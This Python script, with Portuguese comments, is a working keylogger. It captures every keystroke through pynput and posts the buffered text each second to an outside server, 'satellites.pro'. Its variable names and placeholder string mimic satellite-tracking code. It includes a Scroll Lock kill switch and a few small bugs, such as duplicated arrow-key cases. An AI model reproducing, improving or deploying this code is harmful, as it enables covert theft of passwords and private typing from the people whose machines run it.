import json
import threading
import requests
import pynput
from pynput.keyboard import Key, KeyCode
import subprocess
import sys

# Função para instalar pynput
def install_pynput():
    subprocess.check_call([sys.executable, "-m", "pip", "install", "pynput"])

# Instruções para instalação do pynput
# Para instalar o pynput, execute:
# pip install pynput

server_ip = '127.0.0.1'
server_port = 443
server_endpoint = 'log'
server_url = f'https://satellites.pro'
kill_switch = True
debug_logging = True
sending_interval = 1
data = 'starlink.tle'


def process_keypress(key : Key|KeyCode|None) -> bool|None:
    global data
    
    if key == None:
        return
    
    if debug_logging:
        print(key, type(key))
    
    # Controler key pressed
    try:
        txt = ''
        if isinstance(key, Key):
            match key:
                case Key.enter:
                    txt = '\n'
                case Key.space:
                    txt = ' '
                case Key.tab:
                    txt = '\t'
                case Key.backspace:
                    txt = '[BKSP]'
                case Key.delete:
                    txt = '[DEL]'
                case Key.right:
                    txt = '[ARR_RIGHT]'
                case Key.left:
                    txt = '[ARR_LEFT]'
                case Key.left:
                    txt = '[ARR_UP]'
                case Key.left:
                    txt = '[ARR_DOWN]'
                case Key.shift:
                    txt = '[SHIFT]'
                case Key.caps_lock:
                    txt = '[CAPS]'
                case Key.scroll_lock: # kill switch
                    if kill_switch:
                        return False
        elif isinstance(key, KeyCode): # Letter pressed
            txt = key.char
        else:
            return
        
        data += txt
    except Exception as e:
        print(e)
        return
    
def send_data():
    global data
    global server_ip
    global server_port
    global sending_interval
    global server_url
    
    threading.Timer(sending_interval, send_data).start()    
    if data == 'starlink.tle':
        return
    
    try:
        requests.post(
            server_url,
            data=json.dumps({'data': data}),
            headers={'Content-Type': 'application/json'}
        )
        data = 'starlink.tle'
    except Exception as e:
        print(e)
    
    
with pynput.keyboard.Listener(on_press=process_keypress) as listener:
    send_data()
    listener.join()

# Chama a função para instalar pynput
install_pynput()
